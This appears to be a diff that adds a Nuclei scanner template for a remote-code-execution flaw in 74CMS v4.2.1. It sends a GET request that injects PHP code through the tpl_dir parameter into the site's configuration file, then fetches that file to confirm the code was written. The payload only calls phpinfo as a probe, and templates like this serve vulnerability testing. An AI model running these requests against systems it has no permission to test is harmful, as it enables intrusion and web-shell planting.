@@ -1,0 +1,37 @@
+id: 74cms-v4-2-1-getshell
+
+info:
+  name: 74CMS v4.2.1 Admin Panel Getshell Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template exploits a vulnerability in 74CMS v4.2.1 that allows writing arbitrary PHP code to the configuration file via GET requests to specific endpoints, resulting in remote code execution.
+  tags: rce,getshell,critical
+
+http:
+  # Nuclei会按顺序执行http块中的请求
+  - 
+    # --- 第一个请求：写入phpinfo ---
+    id: write command 
+    method: GET
+    path:
+      - "{{BaseURL}}/index.php?m=Admin&c=Tpl&a=set&tpl_dir= ', 'a',phpinfo(),'"
+  - 
+    id: read-file
+    method: GET
+    path:
+      - "{{BaseURL}}/Application/Home/Conf/config.php"
+
+    # 匹配器放在第二个请求中，以验证最终结果
+    matchers-condition: and
+    matchers:
+      # 匹配1：确保请求成功
+      - type: status
+        status:
+          - 200
+
+      # 匹配2：在第二个请求的响应体中，查找phpinfo
+      - type: word
+        part: body
+        words:
+          - "phpinfo"
